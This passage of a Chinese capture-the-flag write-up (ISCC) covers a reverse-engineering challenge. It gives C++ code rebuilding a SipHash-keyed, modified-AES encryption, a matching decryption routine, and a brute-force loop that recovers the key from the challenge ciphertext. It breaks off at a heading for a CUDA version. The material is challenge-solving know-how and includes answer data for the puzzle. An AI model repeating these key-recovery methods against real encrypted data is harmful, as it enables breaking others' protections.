^= mi;</span><br><span class="line"><span class="built_in">DOUBLE_ROUND</span>(v0, v1, v2, v3);</span><br><span class="line">v0 ^= mi;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> t = <span class="number">0</span>; <span class="type">uint8_t</span>* pt = (<span class="type">uint8_t</span>*)&amp;t; <span class="type">uint8_t</span>* m = (<span class="type">uint8_t</span>*)in;</span><br><span class="line"><span class="keyword">if</span> (src_sz == <span class="number">7</span>)</span><br><span class="line">&#123;</span><br><span class="line">pt[<span class="number">6</span>] = m[<span class="number">6</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (src_sz == <span class="number">6</span>)</span><br><span class="line">&#123;</span><br><span class="line">pt[<span class="number">5</span>] = m[<span class="number">5</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (src_sz == <span class="number">5</span>)</span><br><span class="line">&#123;</span><br><span class="line">pt[<span class="number">4</span>] = m[<span class="number">4</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (src_sz == <span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">*((<span class="type">uint32_t</span>*)&amp;pt[<span class="number">0</span>]) = *((<span class="type">uint32_t</span>*)&amp;m[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (src_sz == <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line">pt[<span class="number">2</span>] = m[<span class="number">2</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (src_sz == <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">pt[<span class="number">1</span>] = m[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (src_sz == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">pt[<span class="number">0</span>] = m[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line">b |= _le64toh(t);</span><br><span class="line"></span><br><span class="line">v3 ^= b;</span><br><span class="line"><span class="built_in">DOUBLE_ROUND</span>(v0, v1, v2, v3);</span><br><span class="line">v0 ^= b; v2 ^= <span class="number">0xff</span>;</span><br><span class="line"><span class="built_in">DOUBLE_ROUND</span>(v0, v1, v2, v3);</span><br><span class="line"><span class="built_in">DOUBLE_ROUND</span>(v0, v1, v2, v3);</span><br><span class="line"><span class="keyword">return</span> (v0 ^ v1) ^ (v2 ^ v3);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> lRam00000c68&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">uint32_t</span> <span class="title">my_rand</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">lRam00000c68 = lRam00000c68 * <span class="number">0x5851f42d4c957f2d</span> + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> (<span class="type">uint32_t</span>)((<span class="type">uint64_t</span>)lRam00000c68 &gt;&gt; <span class="number">0x21</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">my_srand</span><span class="params">(<span class="type">uint32_t</span> seed)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">lRam00000c68 = (<span class="type">uint64_t</span>)(seed - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 随机数生成列表</span></span><br><span class="line"><span class="built_in">my_srand</span>(<span class="number">1746373320</span>);</span><br><span class="line"><span class="type">uint8_t</span> rndList[<span class="number">16</span>]&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">rndList[i] = i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">rndList[i] += (<span class="type">uint8_t</span>)(<span class="built_in">my_rand</span>() % <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输入48长度</span></span><br><span class="line"><span class="type">uint8_t</span> input[] = <span class="string">&quot;ISCC&#123;1234123544556ASDASeffgghhiijj12321312312kk&#125;&quot;</span>;</span><br><span class="line"><span class="type">uint8_t</span> out[<span class="number">16</span>]&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// hash明文取input前八字节和最后一个字节</span></span><br><span class="line"><span class="type">uint8_t</span> hash_plaintext[<span class="number">9</span>]&#123;&#125;;</span><br><span class="line"><span class="built_in">memcpy</span>(hash_plaintext, input, <span class="number">8</span>);</span><br><span class="line">hash_plaintext[<span class="number">8</span>] = <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// spihash计算</span></span><br><span class="line"><span class="type">uint64_t</span> hash = <span class="built_in">siphash24</span>(hash_plaintext, <span class="number">9</span>, (<span class="type">const</span> <span class="type">char</span>*)rndList);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 用hash生成Key</span></span><br><span class="line"><span class="type">uint8_t</span> key[<span class="number">16</span>]&#123;&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">key[i] = (<span class="type">uint8_t</span>)(hash &gt;&gt; (i * <span class="number">8</span> &amp; <span class="number">0x3f</span>));</span><br><span class="line">key[i * <span class="number">2</span> + <span class="number">1</span>] = (<span class="type">uint8_t</span>)(hash &gt;&gt; (i * <span class="number">-8</span> + <span class="number">0x38</span> &amp; <span class="number">0x3f</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">48</span>; i += <span class="number">16</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">aesEncrypt</span>(key, <span class="number">16</span>, input + i, out, <span class="number">16</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x%02x,&quot;</span>, out[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>AES魔改后解密代码：</p><p>代码基于：<a href="https://github.com/lmshao/AES">https://github.com/lmshao/AES</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">char</span> inv_S[] = &#123; <span class="number">0xD1</span>, <span class="number">0x41</span>, <span class="number">0x09</span>, <span class="number">0xF9</span>, <span class="number">0x3F</span>, <span class="number">0x56</span>, <span class="number">0xFF</span>, <span class="number">0xCD</span>, <span class="number">0x1F</span>, <span class="number">0x91</span>, <span class="number">0xFB</span>, <span class="number">0xD4</span>, <span class="number">0x94</span>, <span class="number">0x27</span>, <span class="number">0xDC</span>, <span class="number">0xBB</span>, <span class="number">0x5B</span>, <span class="number">0xA9</span>, <span class="number">0xFA</span>, <span class="number">0xEA</span>, <span class="number">0xEF</span>, <span class="number">0x47</span>, <span class="number">0xA8</span>, <span class="number">0x6D</span>, <span class="number">0x32</span>, <span class="number">0xE4</span>, <span class="number">0x4D</span>, <span class="number">0xDF</span>, <span class="number">0xB2</span>, <span class="number">0xD6</span>, <span class="number">0x01</span>, <span class="number">0x8A</span>, <span class="number">0x07</span>, <span class="number">0x79</span>, <span class="number">0x21</span>, <span class="number">0x12</span>, <span class="number">0x4B</span>, <span class="number">0xC8</span>, <span class="number">0xD2</span>, <span class="number">0x77</span>, <span class="number">0xFE</span>, <span class="number">0x10</span>, <span class="number">0x13</span>, <span class="number">0x5C</span>, <span class="number">0x7B</span>, <span class="number">0xF8</span>, <span class="number">0x43</span>, <span class="number">0x37</span>, <span class="number">0x4F</span>, <span class="number">0x59</span>, <span class="number">0x26</span>, <span class="number">0xC4</span>, <span class="number">0xF0</span>, <span class="number">0xC3</span>, <span class="number">0x3C</span>, <span class="number">0x3D</span>, <span class="number">0xD9</span>, <span class="number">0xC0</span>, <span class="number">0x16</span>, <span class="number">0xA3</span>, <span class="number">0x87</span>, <span class="number">0x03</span>, <span class="number">0xD5</span>, <span class="number">0x00</span>, <span class="number">0xAD</span>, <span class="number">0x23</span>, <span class="number">0x0F</span>, <span class="number">0x5E</span>, <span class="number">0x7F</span>, <span class="number">0x89</span>, <span class="number">0x2A</span>, <span class="number">0x82</span>, <span class="number">0x84</span>, <span class="number">0x30</span>, <span class="number">0x78</span>, <span class="number">0x83</span>, <span class="number">0xEB</span>, <span class="number">0xBA</span>, <span class="number">0x72</span>, <span class="number">0xB7</span>, <span class="number">0xC1</span>, <span class="number">0x05</span>, <span class="number">0x58</span>, <span class="number">0x90</span>, <span class="number">0x0C</span>, <span class="number">0x39</span>, <span class="number">0x50</span>, <span class="number">0x7C</span>, <span class="number">0xD8</span>, <span class="number">0xDD</span>, <span class="number">0x42</span>, <span class="number">0x8B</span>, <span class="number">0x1E</span>, <span class="number">0x4A</span>, <span class="number">0x2C</span>, <span class="number">0x6E</span>, <span class="number">0xE9</span>, <span class="number">0x96</span>, <span class="number">0x60</span>, <span class="number">0x75</span>, <span class="number">0x49</span>, <span class="number">0xAF</span>, <span class="number">0x3E</span>, <span class="number">0x2F</span>, <span class="number">0x04</span>, <span class="number">0x9A</span>, <span class="number">0xBC</span>, <span class="number">0xD3</span>, <span class="number">0x48</span>, <span class="number">0x71</span>, <span class="number">0x0D</span>, <span class="number">0x5D</span>, <span class="number">0x2B</span>, <span class="number">0x7A</span>, <span class="number">0x4C</span>, <span class="number">0x53</span>, <span class="number">0x1D</span>, <span class="number">0x4E</span>, <span class="number">0x33</span>, <span class="number">0xD0</span>, <span class="number">0xDB</span>, <span class="number">0x8F</span>, <span class="number">0xB3</span>, <span class="number">0x62</span>, <span class="number">0x61</span>, <span class="number">0x7D</span>, <span class="number">0xE5</span>, <span class="number">0x9D</span>, <span class="number">0xF2</span>, <span class="number">0x9B</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x1B</span>, <span class="number">0x80</span>, <span class="number">0xA7</span>, <span class="number">0xB5</span>, <span class="number">0xE0</span>, <span class="number">0x29</span>, <span class="number">0x28</span>, <span class="number">0x24</span>, <span class="number">0xC9</span>, <span class="number">0x36</span>, <span class="number">0xA5</span>, <span class="number">0x69</span>, <span class="number">0xC5</span>, <span class="number">0x45</span>, <span class="number">0x08</span>, <span class="number">0xDE</span>, <span class="number">0x9F</span>, <span class="number">0x55</span>, <span class="number">0xF1</span>, <span class="number">0xA2</span>, <span class="number">0xFD</span>, <span class="number">0xCF</span>, <span class="number">0xF4</span>, <span class="number">0xE2</span>, <span class="number">0xCA</span>, <span class="number">0x0A</span>, <span class="number">0xF6</span>, <span class="number">0xB8</span>, <span class="number">0x2D</span>, <span class="number">0x8D</span>, <span class="number">0x15</span>, <span class="number">0x63</span>, <span class="number">0x6A</span>, <span class="number">0xEE</span>, <span class="number">0x1C</span>, <span class="number">0x22</span>, <span class="number">0xBD</span>, <span class="number">0xA1</span>, <span class="number">0x98</span>, <span class="number">0xB9</span>, <span class="number">0x0B</span>, <span class="number">0xAA</span>, <span class="number">0x73</span>, <span class="number">0x7E</span>, <span class="number">0x99</span>, <span class="number">0x52</span>, <span class="number">0xAE</span>, <span class="number">0x5A</span>, <span class="number">0x38</span>, <span class="number">0x1A</span>, <span class="number">0x57</span>, <span class="number">0xB1</span>, <span class="number">0x8C</span>, <span class="number">0x9C</span>, <span class="number">0x19</span>, <span class="number">0x5F</span>, <span class="number">0x66</span>, <span class="number">0x34</span>, <span class="number">0x64</span>, <span class="number">0x51</span>, <span class="number">0x17</span>, <span class="number">0x81</span>, <span class="number">0xDA</span>, <span class="number">0xBF</span>, <span class="number">0x8E</span>, <span class="number">0x3A</span>, <span class="number">0x97</span>, <span class="number">0x54</span>, <span class="number">0x3B</span>, <span class="number">0x68</span>, <span class="number">0x70</span>, <span class="number">0xB0</span>, <span class="number">0xEC</span>, <span class="number">0xB6</span>, <span class="number">0xA0</span>, <span class="number">0xFC</span>, <span class="number">0x35</span>, <span class="number">0xAB</span>, <span class="number">0xE3</span>, <span class="number">0x31</span>, <span class="number">0x18</span>, <span class="number">0x14</span>, <span class="number">0x95</span>, <span class="number">0xAC</span>, <span class="number">0x40</span>, <span class="number">0x65</span>, <span class="number">0xA4</span>, <span class="number">0xE7</span>, <span class="number">0x67</span>, <span class="number">0xE1</span>, <span class="number">0xBE</span>, <span class="number">0xC6</span>, <span class="number">0xCB</span>, <span class="number">0xD7</span>, <span class="number">0xCE</span>, <span class="number">0x6B</span>, <span class="number">0xF7</span>, <span class="number">0xA6</span>, <span class="number">0xF3</span>, <span class="number">0x6C</span>, <span class="number">0x11</span>, <span class="number">0x6F</span>, <span class="number">0x92</span>, <span class="number">0x25</span>, <span class="number">0x9E</span>, <span class="number">0x44</span>, <span class="number">0x93</span>, <span class="number">0x2E</span>, <span class="number">0x06</span>, <span class="number">0x88</span>, <span class="number">0x20</span>, <span class="number">0xED</span>, <span class="number">0x85</span>, <span class="number">0xF5</span>, <span class="number">0xB4</span>, <span class="number">0xCC</span>, <span class="number">0xC7</span>, <span class="number">0xE6</span>, <span class="number">0xC2</span>, <span class="number">0x0E</span>, <span class="number">0x02</span>, <span class="number">0x86</span>, <span class="number">0xE8</span>, <span class="number">0x46</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">aesDecrypt</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *key, <span class="type">uint32_t</span> keyLen, <span class="type">const</span> <span class="type">uint8_t</span> *ct, <span class="type">uint8_t</span> *pt, <span class="type">uint32_t</span> len)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    AesKey aesKey;</span><br><span class="line">    <span class="type">uint8_t</span> *pos = pt;</span><br><span class="line">    <span class="type">const</span> <span class="type">uint32_t</span> *rk = aesKey.dK;</span><br><span class="line">    <span class="type">uint8_t</span> out[BLOCKSIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">uint8_t</span> actualKey[<span class="number">16</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">uint8_t</span> state[<span class="number">4</span>][<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(actualKey, key, keyLen);</span><br><span class="line">    <span class="built_in">keyExpansion</span>(actualKey, <span class="number">16</span>, &amp;aesKey);</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i += BLOCKSIZE) &#123;</span><br><span class="line">        <span class="built_in">loadStateArray</span>(state, ct);</span><br><span class="line">        <span class="built_in">addRoundKey</span>(state, rk);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt; <span class="number">10</span>; ++j) &#123;</span><br><span class="line">            rk += <span class="number">4</span>;</span><br><span class="line">            <span class="built_in">invShiftRows</span>(state);</span><br><span class="line">            <span class="built_in">invSubBytes</span>(state);</span><br><span class="line">            <span class="comment">// 解密交换addRoundKey和invMixColumns的调用顺序</span></span><br><span class="line">            <span class="built_in">invMixColumns</span>(state);</span><br><span class="line">            <span class="built_in">addRoundKey</span>(state, rk);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">invSubBytes</span>(state);</span><br><span class="line">        <span class="built_in">invShiftRows</span>(state);</span><br><span class="line">        <span class="built_in">addRoundKey</span>(state, rk<span class="number">+4</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">storeStateArray</span>(state, pos);</span><br><span class="line">        pos += BLOCKSIZE;</span><br><span class="line">        ct += BLOCKSIZE;</span><br><span class="line">        rk = aesKey.dK;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="CPU爆破样板代码"><a href="#CPU爆破样板代码" class="headerlink" title="CPU爆破样板代码"></a>CPU爆破样板代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Crack</span><span class="params">(<span class="type">uint8_t</span>* KeyOut)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 密文</span></span><br><span class="line"><span class="type">uint8_t</span> enc1[<span class="number">48</span>]&#123;<span class="number">0x9f</span>, <span class="number">0xb3</span>, <span class="number">0xb8</span>, <span class="number">0x2f</span>, <span class="number">0x23</span>, <span class="number">0x82</span>, <span class="number">0x19</span>, <span class="number">0x7d</span>, <span class="number">0xe7</span>, <span class="number">0x2a</span>, <span class="number">0x8b</span>, <span class="number">0x20</span>, <span class="number">0x0c</span>, <span class="number">0x5b</span>, <span class="number">0x79</span>, <span class="number">0x72</span>, <span class="number">0xf7</span>, <span class="number">0x07</span>, <span class="number">0xa0</span>, <span class="number">0x63</span>, <span class="number">0x53</span>, <span class="number">0x99</span>, <span class="number">0x49</span>, <span class="number">0xc2</span>, <span class="number">0x51</span>, <span class="number">0xde</span>, <span class="number">0x86</span>, <span class="number">0x1b</span>, <span class="number">0x87</span>, <span class="number">0x2f</span>, <span class="number">0x31</span>, <span class="number">0x6b</span>, <span class="number">0xbc</span>, <span class="number">0xfa</span>, <span class="number">0x5b</span>, <span class="number">0x9a</span>, <span class="number">0x6b</span>, <span class="number">0x12</span>, <span class="number">0x16</span>, <span class="number">0x8b</span>, <span class="number">0x31</span>, <span class="number">0xf6</span>, <span class="number">0x6c</span>, <span class="number">0x1d</span>, <span class="number">0x94</span>, <span class="number">0xba</span>, <span class="number">0x2f</span>, <span class="number">0x37</span> &#125;;</span><br><span class="line">    <span class="comment">// 解密明文</span></span><br><span class="line"><span class="type">uint8_t</span> out[<span class="number">16</span>]&#123;&#125;;</span><br><span class="line">    <span class="comment">// 爆破三个字节全排列</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> c1 = <span class="number">32</span>; c1 &lt; <span class="number">127</span>; c1++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> c2 = <span class="number">32</span>; c2 &lt; <span class="number">127</span>; c2++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> c3 = <span class="number">32</span>; c3 &lt; <span class="number">127</span>; c3++)</span><br><span class="line">&#123;</span><br><span class="line">                <span class="comment">// 爆破16个01的全排列</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> rnd_v = <span class="number">0</span>; rnd_v &lt; <span class="number">0xffff</span>; rnd_v++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">uint8_t</span> rndList[<span class="number">16</span>]&#123; &#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">rndList[i] = i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">rndList[i] += (rnd_v &gt;&gt; (<span class="number">15</span>-i)) &amp; <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 组合目标hash字符串</span></span><br><span class="line"><span class="type">uint8_t</span> hash_plaintext[] = <span class="string">&quot;ISCC&#123;xxx&#125;&quot;</span>;</span><br><span class="line">hash_plaintext[<span class="number">5</span>] = c1;</span><br><span class="line">hash_plaintext[<span class="number">6</span>] = c2;</span><br><span class="line">hash_plaintext[<span class="number">7</span>] = c3;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> hash = <span class="built_in">siphash24</span>(hash_plaintext, <span class="number">9</span>, (<span class="type">const</span> <span class="type">char</span>*)rndList);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 扩展生成Key</span></span><br><span class="line"><span class="type">uint8_t</span> key[<span class="number">16</span>]&#123;&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">key[i] = (<span class="type">uint8_t</span>)(hash &gt;&gt; (i * <span class="number">8</span> &amp; <span class="number">0x3f</span>));</span><br><span class="line">key[i * <span class="number">2</span> + <span class="number">1</span>] = (<span class="type">uint8_t</span>)(hash &gt;&gt; (i * <span class="number">-8</span> + <span class="number">0x38</span> &amp; <span class="number">0x3f</span>));</span><br><span class="line">&#125;</span><br><span class="line">                    <span class="comment">// 仅解密前16字节用于校验Key</span></span><br><span class="line"><span class="built_in">aesDecrypt</span>(key, <span class="number">16</span>, enc1, out, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (out[<span class="number">0</span>] == <span class="string">&#x27;I&#x27;</span> &amp;&amp; out[<span class="number">1</span>] == <span class="string">&#x27;S&#x27;</span> &amp;&amp; out[<span class="number">2</span>] == <span class="string">&#x27;C&#x27;</span> &amp;&amp; out[<span class="number">3</span>] == <span class="string">&#x27;C&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">memcpy</span>(KeyOut, key, <span class="number">16</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x &quot;</span>, key[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CPU爆破代码转CUDA爆破代码"><a href="#CPU爆破代码转CUDA爆破代码" class="headerlink" title="CPU爆破代码转CUDA爆破代码"></a>CPU爆破代码转CUDA爆破代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span 